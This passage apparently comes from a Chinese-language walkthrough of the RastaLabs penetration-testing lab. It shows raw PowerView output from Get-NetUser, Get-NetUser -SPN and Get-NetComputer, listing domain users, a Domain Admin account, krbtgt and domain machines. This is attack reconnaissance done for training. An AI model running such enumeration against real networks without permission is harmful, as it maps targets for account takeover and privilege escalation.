showinaddressbook          : {CN=All Users,CN=All Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global Address 
                             List,CN=All Global Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                             Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                             Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All Mailboxes(VLV),CN=All 
                             System Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
badpwdcount                : 0
useraccountcontrol         : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                : 21/10/2017 09:47:37
countrycode                : 0
primarygroupid             : 513
pwdlastset                 : 27/10/2017 14:30:29
usnchanged                 : 1430659
msexchdumpsterwarningquota : 20971520

name                       : Nicholas Godfrey (Admin)
logoncount                 : 25
badpasswordtime            : 26/10/2017 22:07:11
distinguishedname          : CN=Nicholas Godfrey (Admin),CN=Users,DC=rastalabs,DC=local
objectclass                : {top, person, organizationalPerson, user}
displayname                : Nicholas Godfrey (Admin)
samaccounttype             : USER_OBJECT
userprincipalname          : ngodfrey_adm@rastalabs.local
msexchuseraccountcontrol   : 0
usncreated                 : 45092
objectsid                  : S-1-5-21-1396373213-2872852198-2033860859-1160
samaccountname             : ngodfrey_adm
lastlogontimestamp         : 13/03/2026 15:21:35
codepage                   : 0
msexchhomeservername       : /o=RastaLabs/ou=Exchange Administrative Group 
                             (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexchumdtmfmap            : {lastNameFirstName:463373964246527, firstNameLastName:642465274633739}
accountexpires             : NEVER
cn                         : Nicholas Godfrey (Admin)
whenchanged                : 13/03/2026 15:21:35
instancetype               : 4
title                      : Desktop Support Engineer
objectguid                 : 825a3d2b-c9d0-4081-86e4-6132e6f01a4a
department                 : IT
lastlogoff                 : 01/01/1601 00:00:00
objectcategory             : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata      : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 14:24:59...}
givenname                  : Nicholas
msexchdumpsterquota        : 31457280
memberof                   : CN=Desktop Support,CN=Users,DC=rastalabs,DC=local
mdbusedefaults             : True
lastlogon                  : 15/10/2023 16:00:07
sn                         : Godfrey
showinaddressbook          : {CN=All Users,CN=All Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global Address 
                             List,CN=All Global Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                             Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                             Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All Mailboxes(VLV),CN=All 
                             System Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
badpwdcount                : 0
useraccountcontrol         : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                : 21/10/2017 09:48:43
countrycode                : 0
primarygroupid             : 513
pwdlastset                 : 26/10/2017 22:08:45
usnchanged                 : 1502868
msexchdumpsterwarningquota : 20971520

logoncount                 : 1148
badpasswordtime            : 14/10/2024 07:24:10
distinguishedname          : CN=Rhys Weston (DA),CN=Users,DC=rastalabs,DC=local
objectclass                : {top, person, organizationalPerson, user}
displayname                : Rhys Weston (DA)
samaccounttype             : USER_OBJECT
userprincipalname          : rweston_da@rastalabs.local
name                       : Rhys Weston (DA)
usncreated                 : 45100
objectsid                  : S-1-5-21-1396373213-2872852198-2033860859-1161
samaccountname             : rweston_da
codepage                   : 0
lastlogontimestamp         : 13/03/2026 03:09:00
homedirectory              : \\fs01.rastalabs.local\home$\rweston_da
msexchhomeservername       : /o=RastaLabs/ou=Exchange Administrative Group 
                             (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexchumdtmfmap            : {lastNameFirstName:9378667497, firstNameLastName:7497937866}
accountexpires             : NEVER
cn                         : Rhys Weston (DA)
whenchanged                : 13/03/2026 03:09:00
instancetype               : 4
title                      : Senior Infrastructure Engineer
objectguid                 : cf13d0f5-a265-4fe1-8030-49fcd097dee3
department                 : IT
lastlogoff                 : 01/01/1601 00:00:00
objectcategory             : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata      : {20/09/2023 10:04:42, 20/09/2023 09:10:45, 31/08/2021 07:35:32, 31/08/2021 06:40:55...}
givenname                  : Rhys
msexchdumpsterquota        : 31457280
admincount                 : 1
memberof                   : CN=Domain Admins,CN=Users,DC=rastalabs,DC=local
mdbusedefaults             : True
lastlogon                  : 13/03/2026 19:37:55
msexchuseraccountcontrol   : 0
showinaddressbook          : {CN=All Users,CN=All Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global Address 
                             List,CN=All Global Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                             Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                             Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All Mailboxes(VLV),CN=All 
                             System Address Lists,CN=Address Lists Container,CN=RastaLabs,CN=Microsoft 
                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
badpwdcount                : 0
homedrive                  : M:
useraccountcontrol         : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                : 21/10/2017 09:49:17
countrycode                : 0
pwdlastset                 : 27/10/2017 14:24:34
usnchanged                 : 1499400
sn                         : Weston
primarygroupid             : 513
msexchdumpsterwarningquota : 20971520

mail                            : ahope@rastalabs.local
instancetype                    : 4
msexchmailboxguid               : {125, 250, 205, 201...}
department                      : Human Resources
logoncount                      : 14822
codepage                        : 0
homemdb                         : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchdumpsterwarningquota      : 20971520
homedirectory                   : \\fs01.rastalabs.local\home$\ahope
samaccountname                  : ahope
countrycode                     : 0
lastlogontimestamp              : 13/03/2026 10:30:31
userprincipalname               : ahope@rastalabs.local
logonhours                      : {255, 255, 255, 255...}
proxyaddresses                  : SMTP:ahope@rastalabs.local
useraccountcontrol              : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usnchanged                      : 1501013
dscorepropagationdata           : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 16/12/2017 14:25:33, 16/12/2017 
                                  14:24:59...}
givenname                       : Amber
msexchrecipientdisplaytype      : 1073741824
msexchuseraccountcontrol        : 0
badpwdcount                     : 0
physicaldeliveryofficename      : Kent
displayname                     : Amber Hope
objectsid                       : S-1-5-21-1396373213-2872852198-2033860859-1164
samaccounttype                  : USER_OBJECT
lastlogon                       : 13/03/2026 18:42:26
homedrive                       : M:
mailnickname                    : ahope
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchversion                   : 88218628259840
memberof                        : CN=Human Resources,CN=Users,DC=rastalabs,DC=local
badpasswordtime                 : 13/03/2026 15:12:19
msexchumdtmfmap                 : {emailAddress:24673, lastNameFirstName:467326237, firstNameLastName:262374673}
msexchtextmessagingstate        : {302120705, 16842751}
title                           : Senior Advisor
objectguid                      : de49ed8c-2f95-4d32-bdd3-168b9241515f
msexchhomeservername            : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
usncreated                      : 45318
msexchelcmailboxflags           : 130
legacyexchangedn                : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Recipients/cn=8e225d39cd7c435da02266044752d87a-Amber Hope
msexcharchivequota              : 104857600
msexchcalendarloggingquota      : 6291456
whencreated                     : 21/10/2017 10:53:30
msexchdumpsterquota             : 31457280
pwdlastset                      : 04/06/2025 10:11:16
whenchanged                     : 13/03/2026 10:30:31
showinaddressbook               : {CN=All Users,CN=All Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global 
                                  Address List,CN=All Global Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
distinguishedname               : CN=Amber Hope,CN=Users,DC=rastalabs,DC=local
sn                              : Hope
cn                              : Amber Hope
lastlogoff                      : 01/01/1601 00:00:00
mdbusedefaults                  : True
objectclass                     : {top, person, organizationalPerson, user}
msexcharchivewarnquota          : 94371840
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
msexchpoliciesincluded          : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
name                            : Amber Hope
msexchwhenmailboxcreated        : 22/10/2017 19:40:33
accountexpires                  : 01/01/1601 00:00:00
msexchuserculture               : en-GB
msexchrecipienttypedetails      : 1
lockouttime                     : 0
primarygroupid                  : 513

name                            : Tami Quinn
logoncount                      : 291
lastlogontimestamp              : 13/03/2026 03:08:08
badpasswordtime                 : 13/03/2026 15:12:19
msexchuserculture               : en-GB
mailnickname                    : tquinn
msexchumdtmfmap                 : {emailAddress:878466, lastNameFirstName:784668264, firstNameLastName:826478466}
objectclass                     : {top, person, organizationalPerson, user}
displayname                     : Tami Quinn
samaccounttype                  : USER_OBJECT
userprincipalname               : tquinn@rastalabs.local
cn                              : Tami Quinn
msexchuseraccountcontrol        : 0
usncreated                      : 284396
objectsid                       : S-1-5-21-1396373213-2872852198-2033860859-2102
codepage                        : 0
samaccountname                  : tquinn
msexchmailboxsecuritydescriptor : {1, 0, 4, 128...}
msexchelcmailboxflags           : 130
homedirectory                   : \\fs01.rastalabs.local\home$\tquinn
msexchhomeservername            : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
msexcharchivequota              : 104857600
msexchrbacpolicylink            : CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
accountexpires                  : NEVER
countrycode                     : 0
whenchanged                     : 13/03/2026 03:08:08
instancetype                    : 4
title                           : PR
objectguid                      : 30259e24-8519-4f0a-81fb-479fc1914f56
msexchpoliciesincluded          : {91875021-0ff1-402a-8aaf-75370cd1345d, {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchcalendarloggingquota      : 6291456
department                      : Head Office
msexchwhenmailboxcreated        : 05/11/2019 10:29:29
msexcharchivewarnquota          : 94371840
proxyaddresses                  : SMTP:tquinn@rastalabs.local
objectcategory                  : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
distinguishedname               : CN=Tami Quinn,CN=Users,DC=rastalabs,DC=local
dscorepropagationdata           : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 01/01/1601 00:04:17}
givenname                       : Tami
msexchdumpsterquota             : 31457280
primarygroupid                  : 513
memberof                        : CN=Human Resources,CN=Users,DC=rastalabs,DC=local
mdbusedefaults                  : True
lastlogon                       : 13/03/2026 17:09:30
sn                              : Quinn
showinaddressbook               : {CN=Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Mailboxes(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=All 
                                  Recipients(VLV),CN=All System Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, CN=Default Global 
                                  Address List,CN=All Global Address Lists,CN=Address Lists 
                                  Container,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local...}
msexchtextmessagingstate        : {302120705, 16842751}
msexchrecipientdisplaytype      : 1073741824
homemdb                         : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=RastaLabs,CN=Microsoft 
                                  Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
badpwdcount                     : 0
homedrive                       : H:
msexchrecipienttypedetails      : 1
useraccountcontrol              : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                     : 04/11/2019 16:49:56
legacyexchangedn                : /o=RastaLabs/ou=Exchange Administrative Group 
                                  (FYDIBOHF23SPDLT)/cn=Recipients/cn=6973bc054ba446049f1c4faef3b342c7-Tami Quinn
msexchversion                   : 88218628259840
pwdlastset                      : 04/11/2019 16:49:56
mail                            : tquinn@rastalabs.local
usnchanged                      : 1499368
msexchmailboxguid               : {57, 85, 110, 194...}
lastlogoff                      : 01/01/1601 00:00:00
msexchdumpsterwarningquota      : 20971520

logoncount            : 146
badpasswordtime       : 10/08/2022 21:41:51
distinguishedname     : CN=Acronis Backup,CN=Users,DC=rastalabs,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : Acronis Backup
lastlogontimestamp    : 13/03/2026 03:06:03
userprincipalname     : acronis_backup@rastalabs.local
name                  : Acronis Backup
objectsid             : S-1-5-21-1396373213-2872852198-2033860859-4601
samaccountname        : acronis_backup
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
cn                    : Acronis Backup
whenchanged           : 13/03/2026 03:06:03
instancetype          : 4
usncreated            : 1077924
objectguid            : 8e3a4bcc-566c-47bf-bf59-95668acb4fa9
sn                    : Backup
lastlogoff            : 01/01/1601 00:00:00
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata : {20/09/2023 09:10:45, 31/08/2021 06:40:54, 13/08/2020 10:31:41, 01/01/1601 00:04:17}
givenname             : Acronis
lastlogon             : 13/03/2026 03:06:14
badpwdcount           : 0
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 13/08/2020 10:31:41
countrycode           : 0
primarygroupid        : 513
pwdlastset            : 13/08/2020 11:31:41
usnchanged            : 1499299

mail                                       : SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@rastalabs.local
instancetype                               : 4
msexchmailboxguid                          : {237, 59, 52, 71...}
logoncount                                 : 0
msexchmailboxfolderset                     : 0
codepage                                   : 0
msexchrecipientsoftdeletedstatus           : 0
homemdb                                    : CN=Mailbox Database 0721177190,CN=Databases,CN=Exchange Administrative 
                                             Group (FYDIBOHF23SPDLT),CN=Administrative 
                                             Groups,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchhidefromaddresslists                 : True
msexchdumpsterwarningquota                 : 20971520
samaccountname                             : SM_d4210db683be425f9
countrycode                                : 0
msexchapprovalapplicationlink              : {CN=ModeratedRecipients,CN=Approval 
                                             Applications,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local, 
                                             CN=AutoGroup,CN=Approval Applications,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local}
userprincipalname                          : SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@rastalabs.local
proxyaddresses                             : SMTP:SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@rastalabs.local
useraccountcontrol                         : ACCOUNTDISABLE, NORMAL_ACCOUNT
usnchanged                                 : 1200204
dscorepropagationdata                      : {20/09/2023 09:10:45, 31/08/2021 07:12:30, 31/08/2021 06:40:55, 
                                             31/08/2021 06:40:47...}
msexchmessagehygienesclrejectthreshold     : 7
msexchmailboxsecuritydescriptor            : {1, 0, 4, 128...}
msexchrecipientdisplaytype                 : 10
msexchuseraccountcontrol                   : 2
msexchaddressbookflags                     : 1
badpwdcount                                : 0
msexchmailboxauditenable                   : False
objectsid                                  : S-1-5-21-1396373213-2872852198-2033860859-6601
msexchprovisioningflags                    : 0
samaccounttype                             : USER_OBJECT
lastlogon                                  : 01/01/1601 00:00:00
mailnickname                               : SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
displayname                                : Microsoft Exchange
msexchversion                              : 1126140425011200
objectguid                                 : 21ff6e15-9341-41b2-8938-8e6e303c1039
msexchbypassaudit                          : False
objectclass                                : {top, person, organizationalPerson, user}
msexchumdtmfmap                            : {emailAddress:797836624526922334405312345538937272732720322, 
                                             lastNameFirstName:797836624526922334405312345538937272732720322, 
                                             firstNameLastName:797836624526922334405312345538937272732720322}
legacyexchangedn                           : /o=RastaLabs/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipie
                                             nts/cn=9600a3c72ba9498290ac464dfae79c93-SystemMailbox{
msexchhomeservername                       : /o=RastaLabs/ou=Exchange Administrative Group 
                                             (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=MX01
mdbusedefaults                             : False
objectcategory                             : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
msexchmailboxauditlogagelimit              : 7776000
usncreated                                 : 1199934
msexchelcmailboxflags                      : 130
msexchwhenmailboxcreated                   : 31/08/2021 07:12:29
msexcharchivequota                         : 104857600
msexchcalendarloggingquota                 : 6291456
whencreated                                : 31/08/2021 06:40:47
msexchdumpsterquota                        : 31457280
pwdlastset                                 : 01/01/1601 00:00:00
msexchmessagehygienescldeletethreshold     : 9
whenchanged                                : 31/08/2021 07:12:30
distinguishedname                          : CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=rastala
                                             bs,DC=local
sn                                         : SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
cn                                         : SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
lastlogoff                                 : 01/01/1601 00:00:00
msexchmessagehygienesclquarantinethreshold : 9
msexchtransportrecipientsettingsflags      : 0
msexcharchivewarnquota                     : 94371840
badpasswordtime                            : 01/01/1601 00:00:00
msexchmailboxtemplatelink                  : CN=ArbitrationMailbox,CN=Retention Policies 
                                             Container,CN=RastaLabs,CN=Microsoft 
                                             Exchange,CN=Services,CN=Configuration,DC=rastalabs,DC=local
msexchcapabilityidentifiers                : 66
msexchpoliciesincluded                     : {91875021-0ff1-402a-8aaf-75370cd1345d, 
                                             {26491cfc-9e50-4857-861b-0cb8df22b5d7}}
msexchmoderationflags                      : 6
msexchumenabledflags2                      : -1
name                                       : SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
msexchmessagehygienescljunkthreshold       : 4
accountexpires                             : NEVER
msexchmasteraccountsid                     : {1, 1, 0, 0...}
msexchrecipienttypedetails                 : 8388608
msexchgroupsecurityflags                   : 0
primarygroupid                             : 513


```

### Get-NetUser-SPN
**查看 SPN 用户**

```plain
PS C:\Users\Public> Get-NetUser -SPN


logoncount                    : 0
iscriticalsystemobject        : True
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
showinadvancedviewonly        : True
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 20/09/2023 10:04:42
instancetype                  : 4
usncreated                    : 12324
objectguid                    : d2f4fecf-3d69-4c7c-91a5-8dd68f538582
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 10:04:42, 20/09/2023 09:10:45, 31/08/2021 07:35:32, 31/08/2021 06:40:54...}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=rastalabs,DC=local
lastlogon                     : 01/01/1601 00:00:00
badpasswordtime               : 01/01/1601 00:00:00
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
whencreated                   : 15/10/2017 11:37:22
countrycode                   : 0
primarygroupid                : 513
pwdlastset                    : 15/10/2017 12:37:22
msds-supportedencryptiontypes : 0
usnchanged                    : 1319156
```

### Get-NetComputer
**枚举域机器**

```plain
PS C:\Users\Public> Get-NetComputer


pwdlastset                    : 28/08/2023 14:21:23
logoncount                    : 1583
msds-generationid             : {240, 139, 64, 79...}
serverreferencebl             : CN=DC01,CN=Servers,CN=Telford,CN=Sites,CN=Configuration,DC=rastalabs,DC=local
badpasswordtime               : 01/01/1601 00:00:00
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
distinguishedname             : CN=DC01,OU=Domain Controllers,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:04:31
name                          : DC01
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1000
samaccountname                : DC01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : DC01
whenchanged                   : 13/03/2026 03:04:31
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC01,CN=Topology,CN=Domain System 
                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=rastalabs,DC=local
objectguid                    : 75f5cae5-7b21-405b-8480-9a1101047bfe
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 06:40:54...}
serviceprincipalname          : {TERMSRV/DC01, TERMSRV/dc01.rastalabs.local, exchangeAB/DC01, 
                                exchangeAB/dc01.rastalabs.local...}
usncreated                    : 12293
lastlogon                     : 13/03/2026 19:04:03
badpwdcount                   : 0
msds-supportedencryptiontypes : 28
whencreated                   : 15/10/2017 11:37:22
countrycode                   : 0
primarygroupid                : 516
iscriticalsystemobject        : True
usnchanged                    : 1499234
ridsetreferences              : CN=RID Set,CN=DC01,OU=Domain Controllers,DC=rastalabs,DC=local
dnshostname                   : dc01.rastalabs.local

pwdlastset                    : 17/08/2021 09:43:02
logoncount                    : 1028
badpasswordtime               : 04/05/2020 09:41:43
distinguishedname             : CN=FS01,OU=FS,OU=Member Servers,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:04:32
name                          : FS01
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1103
samaccountname                : FS01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : FS01
whenchanged                   : 13/03/2026 03:04:36
instancetype                  : 4
usncreated                    : 12602
objectguid                    : caaa5b45-0870-45be-a8bc-0d98ae2f697f
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
ms-mcs-admpwdexpirationtime   : 134184494745232273
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 06:40:54...}
serviceprincipalname          : {TERMSRV/FS01, TERMSRV/fs01.rastalabs.local, WSMAN/fs01, WSMAN/fs01.rastalabs.local...}
lastlogon                     : 13/03/2026 19:30:15
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 11:45:02
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499251
dnshostname                   : fs01.rastalabs.local

pwdlastset                    : 09/08/2021 11:55:52
logoncount                    : 1745
badpasswordtime               : 27/01/2018 12:49:12
distinguishedname             : CN=WS01,OU=WS01,OU=Workstations,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:07:59
name                          : WS01
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1104
samaccountname                : WS01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : WS01
whenchanged                   : 13/03/2026 03:08:22
instancetype                  : 4
usncreated                    : 12898
objectguid                    : 92fbd531-e032-407f-a5ea-6d146e02a4c6
operatingsystem               : Windows 10 Pro
operatingsystemversion        : 10.0 (19045)
ms-mcs-admpwdexpirationtime   : 134184497013011443
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 31/08/2021 06:40:55, 19/03/2020 21:50:49, 19/03/2020 21:50:34...}
serviceprincipalname          : {WSMAN/ws01, WSMAN/ws01.rastalabs.local, RestrictedKrbHost/WS01, HOST/WS01...}
lastlogon                     : 13/03/2026 19:38:12
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 12:10:44
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499382
dnshostname                   : ws01.rastalabs.local

pwdlastset                    : 09/08/2021 11:55:56
logoncount                    : 2803
badpasswordtime               : 28/08/2023 14:23:39
distinguishedname             : CN=MX01,OU=MX,OU=Member Servers,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
msexchrmscomputeraccountsbl   : CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=rastalabs,DC=local
lastlogontimestamp            : 13/03/2026 03:04:46
name                          : MX01
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1105
samaccountname                : MX01$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
accountexpires                : NEVER
cn                            : MX01
whenchanged                   : 13/03/2026 03:07:24
instancetype                  : 4
usncreated                    : 12918
objectguid                    : a43a9e82-e995-4f8d-a0d1-29c0d6702a37
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
ms-mcs-admpwdexpirationtime   : 134184496446617435
lastlogoff                    : 01/01/1601 00:00:00
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=rastalabs,DC=local
dscorepropagationdata         : {20/09/2023 09:10:45, 20/09/2023 09:10:45, 31/08/2021 06:40:55, 31/08/2021 06:40:54...}
serviceprincipalname          : {TERMSRV/MX01, TERMSRV/mx01.rastalabs.local, IMAP/MX01, IMAP/mx01.rastalabs.local...}
memberof                      : {CN=Exchange Install Domain Servers,CN=Microsoft Exchange System 
                                Objects,DC=rastalabs,DC=local, CN=Managed Availability Servers,OU=Microsoft Exchange 
                                Security Groups,DC=rastalabs,DC=local, CN=Exchange Trusted Subsystem,OU=Microsoft 
                                Exchange Security Groups,DC=rastalabs,DC=local, CN=Exchange Servers,OU=Microsoft 
                                Exchange Security Groups,DC=rastalabs,DC=local}
lastlogon                     : 13/03/2026 19:31:37
msexchcapabilityidentifiers   : 1
badpwdcount                   : 0
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT
whencreated                   : 15/10/2017 12:16:42
countrycode                   : 0
primarygroupid                : 515
iscriticalsystemobject        : False
msds-supportedencryptiontypes : 28
usnchanged                    : 1499329
dnshostname                   : mx01.rastalabs.local

pwdlastset                    : 09/08/2021 11:41:06
logoncount                    : 1292
badpasswordtime               : 03/10/2023 09:57:53
distinguishedname             : CN=WS02,OU=WS02,OU=Workstations,DC=rastalabs,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 13/03/2026 03:07:58
name                          : WS02
objectsid                     : S-1-5-21-1396373213-2872852198-2033860859-1135
samaccountname                : WS02$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
